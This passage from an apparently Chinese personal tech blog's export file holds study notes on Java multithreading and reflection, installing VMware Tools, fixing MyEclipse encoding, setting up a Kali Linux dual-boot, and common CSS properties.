&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<img src="https://i.loli.net/2021/08/26/df48W6mAlXuGjQ3.png" alt="image-20210826181206428" style="zoom:50%;" />

<ul>
<li><p><strong>实现接口Runnable</strong>具有多线程能力</p>
</li>
<li><p><strong>启动线程：传入目标对象+Thread对象.start()</strong></p>
</li>
<li><p><strong>推荐使用：避免单继承局限性，灵活方便，方便同一个对象被多个线程使用</strong></p>
</li>
</ul>
<h3 id="比较两种方法"><a href="#比较两种方法" class="headerlink" title="比较两种方法"></a>比较两种方法</h3><ul>
<li><p>继承Thread类</p>
<ul>
<li>子类继承Thread类具备多线程能力</li>
<li>启动线程：子类对象.start()</li>
<li><strong>不建议使用</strong>：避免OOP单继承局限性</li>
</ul>
</li>
<li><p>实现Runnable接口</p>
<ul>
<li>实现接口Runnable具有多线程能力</li>
<li>启动线程：传入目标对象+Thread对象.start()</li>
<li><strong>推荐使用</strong>：<strong>避免单继承局限性</strong>，灵活方便，<strong>方便同一个对象被多个线程使用</strong></li>
</ul>
<img src="https://i.loli.net/2021/08/26/QaIKJjtw4ncAovC.png" alt="image-20210826181558650" style="zoom:50%;" /></li>
</ul>
<h3 id="法三：实现Callable接口（暂时了解即可）"><a href="#法三：实现Callable接口（暂时了解即可）" class="headerlink" title="法三：实现Callable接口（暂时了解即可）"></a>法三：实现Callable接口（暂时了解即可）</h3><p>步骤：</p>
<ul>
<li>定义类<strong>实现Callable接口</strong></li>
<li>**实现call()**方法，编写线程执行体</li>
<li><strong>创建执行服务-&gt;提交执行-&gt;获取结果-&gt;关闭服务</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程创建方式3：实现Callable接口</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Callable的好处：</span></span><br><span class="line"><span class="comment"> * 1. 可以定义返回值</span></span><br><span class="line"><span class="comment"> * 2. 可以抛出异常</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCallable</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Boolean</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String url;     <span class="comment">// 图片的网络地址</span></span><br><span class="line">    <span class="keyword">private</span> String name;    <span class="comment">// 图片的文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestCallable</span><span class="params">(String url, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下载图片的执行体</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        WebDownLoader webDownLoader = <span class="keyword">new</span> WebDownLoader();</span><br><span class="line">        webDownLoader.downLoader(url, name);</span><br><span class="line">        System.out.println(<span class="string">&quot;下载了文件名为：&quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        TestCallable t1 = <span class="keyword">new</span> TestCallable(<span class="string">&quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fuploadfile.bizhizu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.cn%2Fup%2Ff1%2Fcd%2F63%2Ff1cd63164d1ff922c286ff631cb22f9b.jpg.source&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.jpg&amp;refer=http%3A%2F%2Fuploadfile.bizhizu.cn&amp;app=2002&amp;size=f9999,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1632627419&amp;t=05c8225e2a04de881deff50946f3fa06&quot;</span>, <span class="string">&quot;1.jpg&quot;</span>);</span><br><span class="line">        TestCallable t2 = <span class="keyword">new</span> TestCallable(<span class="string">&quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fdik.img.kttpdq&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.com%2Fpic%2F75%2F52402%2F6edaab3c79f9906c.jpg&amp;refer=http%3A%2F%2Fdik.img.kttpdq&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1632627419&amp;t&quot;</span> +</span><br><span class="line">                <span class="string">&quot;=da0fd2d2933805dfd24439813eaced44&quot;</span>, <span class="string">&quot;2.jpg&quot;</span>);</span><br><span class="line">        TestCallable t3 = <span class="keyword">new</span> TestCallable(<span class="string">&quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fk.zol-img.com&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.cn%2Fnbbbs%2F7336%2Fa7335241_s.jpg&amp;refer=http%3A%2F%2Fk.zol-img.com.cn&amp;app=2002&amp;size=f9999,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1632627419&amp;t=81b1925f8461c1f782fab729e144d479&quot;</span>, <span class="string">&quot;3.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建执行服务：</span></span><br><span class="line">        ExecutorService ser = Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提交执行</span></span><br><span class="line">        Future&lt;Boolean&gt; r1 = ser.submit(t1);</span><br><span class="line">        Future&lt;Boolean&gt; r2 = ser.submit(t2);</span><br><span class="line">        Future&lt;Boolean&gt; r3 = ser.submit(t3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取结果</span></span><br><span class="line">        <span class="keyword">boolean</span> rs1 = r1.get();</span><br><span class="line">        <span class="keyword">boolean</span> rs2 = r2.get();</span><br><span class="line">        <span class="keyword">boolean</span> rs3 = r3.get();</span><br><span class="line"></span><br><span class="line">        System.out.println(rs1);</span><br><span class="line">        System.out.println(rs2);</span><br><span class="line">        System.out.println(rs3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭服务</span></span><br><span class="line">        ser.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用Callable好处：</p>
<ol>
<li>可以定义返回值</li>
<li>可以抛出异常</li>
</ol>
<h2 id="线程中变量的作用域和访问空间"><a href="#线程中变量的作用域和访问空间" class="headerlink" title="线程中变量的作用域和访问空间"></a>线程中变量的作用域和访问空间</h2><p><img src="https://i.loli.net/2021/09/01/ph3ALJX1lg6m4Qe.png" alt="image-20210901101316366"></p>
<h2 id="线程五个状态"><a href="#线程五个状态" class="headerlink" title="线程五个状态"></a>线程五个状态</h2><ul>
<li>创建：new一个线程</li>
<li>就绪：线程start（）进入就绪</li>
<li>运行：CPU调度执行</li>
<li>阻塞：线程执行全被抢夺</li>
<li>死亡：线程执行完毕，销亡</li>
</ul>
<p><strong>注意：死亡之后的线程不可以再次start，因为一个线程不可以启动两次</strong></p>
<h2 id="线程同步机制"><a href="#线程同步机制" class="headerlink" title="线程同步机制"></a>线程同步机制</h2><h3 id="线程同步方法"><a href="#线程同步方法" class="headerlink" title="线程同步方法"></a>线程同步方法</h3><p><strong>关键字：synchronized</strong></p>
<p>关键字放在方法上面，<strong>默认锁住的是this指代的对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BuyTicket</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//票</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticketNums = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;    <span class="comment">//外部停止方式</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//买票</span></span><br><span class="line">        <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                buy();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    synchronized 实现同步，锁的是this</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//判断是否有票</span></span><br><span class="line">        <span class="keyword">if</span> (ticketNums &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//模拟延时</span></span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//买票</span></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;拿到了&quot;</span> + ticketNums--);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的java代码中，锁住的是BuyTicket类型的对象，因为后面需要修改该对象的ticketNums属性值</p>
<p><img src="https://i.loli.net/2021/09/08/wp8AexIsnu2FD9C.png" alt="image-20210908111419823"></p>
<h3 id="线程同步块"><a href="#线程同步块" class="headerlink" title="线程同步块"></a>线程同步块</h3><p>将<strong>需要同步操作的对象</strong>放在参数列表中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> syn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用到了同步块</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnsafeList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">                    list.add(Thread.currentThread().getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码中，list为需要进行同步操作的变量，所以放到了同步块中，以进行同步控制。</p>
<p><img src="https://i.loli.net/2021/09/08/kGnIcedO3ay9TEL.png" alt="image-20210908111454528"></p>
<h3 id="线程死锁"><a href="#线程死锁" class="headerlink" title="线程死锁"></a>线程死锁</h3><p><strong>同步机制中可能会产生死锁，所以需要避免死锁问题</strong></p>
<h4 id="死锁产生的四个必要条件"><a href="#死锁产生的四个必要条件" class="headerlink" title="死锁产生的四个必要条件"></a>死锁产生的四个必要条件</h4><ol>
<li><strong>互斥条件：</strong>一个资源每次只能被一个进程使用</li>
<li><strong>请求与保持条件：</strong>一个进程因请求资源而阻塞时，对已获得的资源保持不放</li>
<li><strong>不剥夺条件：</strong>进程已获得的资源，在未使用完之前，不能强行剥夺</li>
<li><strong>循环等待条件：</strong>若干进程之间形成一种头尾相接的循环等待资源关系</li>
</ol>
<h4 id="死锁解决方法"><a href="#死锁解决方法" class="headerlink" title="死锁解决方法"></a>死锁解决方法</h4><p><strong>只要破坏上面四个条件中的任意一个就行</strong></p>
<h3 id="Lock接口"><a href="#Lock接口" class="headerlink" title="Lock接口"></a>Lock接口</h3><h4 id="ReentratLock实现类（可重入锁）"><a href="#ReentratLock实现类（可重入锁）" class="headerlink" title="ReentratLock实现类（可重入锁）"></a>ReentratLock实现类（可重入锁）</h4><p><img src="https://i.loli.net/2021/09/08/jpUMN5nkBtch9D6.png" alt="image-20210908143622156"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> syn.Lock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestLock</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestLock2 testLock2 = <span class="keyword">new</span> TestLock2();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(testLock2).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(testLock2).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(testLock2).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestLock2</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tickNums = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义lock锁</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                lock.lock();    <span class="comment">//加锁</span></span><br><span class="line">                <span class="keyword">if</span> (tickNums &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(tickNums--);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();  <span class="comment">//解锁</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h3><h4 id="管程法"><a href="#管程法" class="headerlink" title="管程法"></a>管程法</h4><h4 id="信号灯法："><a href="#信号灯法：" class="headerlink" title="信号灯法："></a>信号灯法：</h4><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><h3 id="线程池的作用"><a href="#线程池的作用" class="headerlink" title="线程池的作用"></a>线程池的作用</h3><p>提前创建好多个线程，放入线程池中，使用时直接获取，使用完返回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。</p>
<h3 id="线程池API"><a href="#线程池API" class="headerlink" title="线程池API"></a>线程池API</h3><ul>
<li>JDK5提供了线程池相关的API：<strong>ExecutorService</strong>和<strong>Executors</strong></li>
<li>ExecutorService：真正的线程池接口。常见子类ThreadPoolExecutor<ul>
<li>void execute（Runnable command）：执行任务/命令，没有返回值，一般用来执行Runnable</li>
<li><T> Future<T> submit（Callable<T> task）：执行任务，有返回值，一般用来执行Callable</li>
<li>void shutdown（）:关闭连接池</li>
</ul>
</li>
<li>Executors：工具类、线程池的工厂类，用于创建并返回不同类型的线程池</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> threadsPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试线程池</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.创建服务，创建线程池</span></span><br><span class="line">        <span class="comment">//newFixedThreadPool 参数为：线程池大小</span></span><br><span class="line">        ExecutorService service = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行</span></span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.关闭连接</span></span><br><span class="line">        service.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/09/ZPcUkoIGBT6xY1a.png" alt="image-20210909155310355"></p>
]]></content>
      <tags>
        <tag>Thread</tag>
        <tag>创建线程</tag>
        <tag>线程五状态</tag>
        <tag>线程同步机制</tag>
      </tags>
  </entry>
  <entry>
    <title>安装VMwareTools</title>
    <url>/2023/06/23/%E5%AE%89%E8%A3%85VMwareTools/</url>
    <content><![CDATA[<h2 id="安装VMware-Tools"><a href="#安装VMware-Tools" class="headerlink" title="安装VMware Tools"></a>安装VMware Tools</h2><span id="more"></span>

<p>VMware Tools可以实现windows和linux之间的复制粘贴</p>
<p>VMware Tools的安装代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt upgrade</span><br><span class="line">sudo apt install open-vm-tools-desktop -y</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>学习笔记——java中的注解和反射</title>
    <url>/2021/08/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94java%E4%B8%AD%E7%9A%84%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><span id="more"></span>

<p>对于每个类而言，JRE都会为其保留一个不变的Class类型的对象。一个Class对象包含了特定的结构（class、interface、enum、annotation、primitive type、void）等相关的信息</p>
<ul>
<li><strong>class本身也是一个类</strong></li>
<li><strong>Class对象只能由系统建立对象</strong></li>
<li><strong>一个Class对象对应的是一个加载到JVM中的一个class文件</strong></li>
<li><strong>每个类的实例都会记得自己是由哪个Class实例所生成</strong></li>
<li><strong>通过Class可以完整地得到一个类中所有被加载的结构</strong></li>
<li><strong>Class类是Reflection的根源，针对任何你想动态加载、运行的类，唯有获得相应的Class对象</strong></li>
</ul>
<h2 id="对象的创建过程本质"><a href="#对象的创建过程本质" class="headerlink" title="对象的创建过程本质"></a>对象的创建过程本质</h2><p>java中的对象主要分为两种：一种是普通类创建的实例对象；另一种是Class对象（只能有系统创建）。其实<strong>Java中的实例对象就是通过Class对象来创建的</strong></p>
<h2 id="获取class对象的方式"><a href="#获取class对象的方式" class="headerlink" title="获取class对象的方式"></a>获取class对象的方式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test03</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;学生&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">方式</th>
<th align="left">代码</th>
</tr>
</thead>
<tbody><tr>
<td align="center">通过对象获得</td>
<td align="left">Class aClass = person.getClass();<br /> System.out.println(aClass.hashCode());</td>
</tr>
<tr>
<td align="center">forName获得</td>
<td align="left">Class aClass1 = Class.forName(“Student”);<br /> System.out.println(aClass1.hashCode());</td>
</tr>
<tr>
<td align="center">通过类名获得</td>
<td align="left">Class aClass2 = Student.class;<br /> System.out.println(aClass2.hashCode());</td>
</tr>
<tr>
<td align="center">基本内置类型的包装类都有一个Type属性</td>
<td align="left">Class aClass3 = Integer.TYPE; <br />System.out.println(aClass3);</td>
</tr>
<tr>
<td align="center">获得父类类型</td>
<td align="left">Class aClass4 = aClass1.getSuperclass(); <br />System.out.println(aClass4.hashCode());</td>
</tr>
</tbody></table>
<p><strong>上三个输出的哈希值是相等的（打印顺序与上面一一对应）：</strong></p>
<p><img src="https://i.loli.net/2021/08/18/2wJ5qBu8IOorhld.png" alt="image-20210818171226626"></p>
]]></content>
      <tags>
        <tag>java创建对象</tag>
        <tag>获取class对象</tag>
      </tags>
  </entry>
  <entry>
    <title>导入项目，出现中文乱码</title>
    <url>/2021/08/08/%E5%AF%BC%E5%85%A5%E9%A1%B9%E7%9B%AE%EF%BC%8C%E5%87%BA%E7%8E%B0%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</url>
    <content><![CDATA[<h2 id="导入项目的时候，出现中文乱码"><a href="#导入项目的时候，出现中文乱码" class="headerlink" title="导入项目的时候，出现中文乱码"></a>导入项目的时候，出现中文乱码</h2><span id="more"></span>

<h4 id="问题：中文出现乱码"><a href="#问题：中文出现乱码" class="headerlink" title="问题：中文出现乱码"></a>问题：中文出现乱码</h4><blockquote>
<p>​    在导入其他人项目的时候，有时候会出现中文乱码的错误</p>
</blockquote>
<h4 id="解决方案：修改MyEclipse的字符编码格式"><a href="#解决方案：修改MyEclipse的字符编码格式" class="headerlink" title="解决方案：修改MyEclipse的字符编码格式"></a>解决方案：修改MyEclipse的字符编码格式</h4><p><img src="https://i.loli.net/2021/08/13/EIKfDFC4RQN9nAg.png" alt="屏幕截图 2021-08-08 181421"></p>
<p><img src="https://i.loli.net/2021/08/13/4xhuGtLqykF1NYf.png" alt="QQ图片20210808181515"></p>
<p>上面字符编码格式改为本身的编码格式</p>
]]></content>
      <tags>
        <tag>中文乱码</tag>
      </tags>
  </entry>
  <entry>
    <title>小新在windows10上安装kali双系统</title>
    <url>/2021/06/08/%E5%B0%8F%E6%96%B0%E5%9C%A8windows10%E4%B8%8A%E5%AE%89%E8%A3%85kali%E5%8F%8C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><span id="more"></span>

<ol>
<li>腾出一个分区（此步骤可以放到最后去做）</li>
<li>kali镜像文件</li>
<li>帮助格式化和创建可引导USB闪存盘的工具：Rufus（建议直接在官网下载，也可以使用其他工具）</li>
<li> U盘（8G以上，用于担当第二步的启动盘）</li>
</ol>
<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h3 id="第一步：下载kali镜像文件"><a href="#第一步：下载kali镜像文件" class="headerlink" title="第一步：下载kali镜像文件"></a>第一步：下载kali镜像文件</h3><ul>
<li>下载地址：<a href="https://mirrors.cloud.tencent.com/">腾讯软件源</a></li>
</ul>
<ul>
<li>进入其中后，找到想要安装的系统（我安装的是kali）<br><img src="https://i.loli.net/2021/06/08/nFlYvH9jQAWyTPD.png" alt="1.png"></li>
<li>选择想要下载版本<br><img src="https://i.loli.net/2021/06/08/ScBTMGYtQfe6Lox.png" alt="2.png"><br><img src="https://i.loli.net/2021/06/08/be2yF86HOcXupAi.png" alt="3.png"></li>
</ul>
<h3 id="第二步：下载Rufus软件"><a href="#第二步：下载Rufus软件" class="headerlink" title="第二步：下载Rufus软件"></a>第二步：下载Rufus软件</h3><ul>
<li>下载地址：<a href="https://rufus.en.softonic.com/download">Rufus</a>（注意留心一下下载的是否是Rufus）<br><img src="https://i.loli.net/2021/06/08/6IHjQ51l4yXUAbC.png" alt="4.png"></li>
</ul>
<h3 id="第三步：制作启动U盘"><a href="#第三步：制作启动U盘" class="headerlink" title="第三步：制作启动U盘"></a>第三步：制作启动U盘</h3><ol>
<li>打开下载好的Rufus<br><img src="https://i.loli.net/2021/06/08/HTLQY5zCsFGBgNw.png" alt="5.png"></li>
<li>①处会自动识别出电脑中的U盘<br>②处选择第一步中下载好的镜像文件<br>点击③处的开始<br><img src="https://i.loli.net/2021/06/08/1uTJPcrgxW7qdh9.png" alt="6.png"></li>
<li>在下面的图片中选择第二个（否则，后面可能找不到启动U盘）<br><img src="https://i.loli.net/2021/06/08/YSNxpogmcQL54Mi.png" alt="7.png"></li>
</ol>
<h3 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h3><ol>
<li>进入控制面板<br><img src="https://i.loli.net/2021/06/08/QJkTiyUZfojElts.png" alt="8.png"></li>
<li>按照下面的步骤依次操作<br><img src="https://i.loli.net/2021/06/08/Hity41vR2ej6LFC.png" alt="9.png"></li>
<li>进入到磁盘管理界面，选择需要分盘的盘符，右击-&gt;<br><img src="https://i.loli.net/2021/06/08/q5A4SyZLXnf3N2g.png" alt="10.png"></li>
<li>根据需要输入大小-&gt;压缩<br><img src="https://i.loli.net/2021/06/08/ypHz9oXc4MTegYS.png" alt="11.png"></li>
<li>在如下图中新出现的位置右击-&gt;新建简单券<br><img src="https://i.loli.net/2021/06/08/2QzbU3ZIlExNdwc.png" alt="12.png"></li>
<li>一直下一步,直到完成(除了下图中的位置需要根据需要设置)<br><img src="https://i.loli.net/2021/06/08/KDdwISRWX3l1Y72.png" alt="13.png"></li>
<li>分区结束</li>
</ol>
]]></content>
      <tags>
        <tag>双系统</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>常用CSS属性</title>
    <url>/2023/05/29/%E5%B8%B8%E7%94%A8CSS%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h2 id="常用CSS属性"><a href="#常用CSS属性" class="headerlink" title="常用CSS属性"></a>常用CSS属性</h2><span id="more"></span>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.分界线</span><br><span class="line"><span class="attribute">border-bottom</span>: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.边框阴影</span><br><span class="line">box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">2px</span> <span class="number">#BEBCBC</span>FF;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.颜色（淡灰色和白色，常用于背景颜色的对比）</span><br><span class="line"><span class="selector-id">#f5f7fa</span></span><br><span class="line"><span class="selector-id">#fff</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.文本指定条件省略号显示</span><br><span class="line"><span class="attribute">overflow-y</span>: hidden;</span><br><span class="line"><span class="attribute">display</span>: -webkit-box; <span class="comment">/*根据不同标签display，有的不用加。或者设置成别的属性，自己可以随便试试*/</span></span><br><span class="line">-webkit-box-orient: vertical;</span><br><span class="line"><span 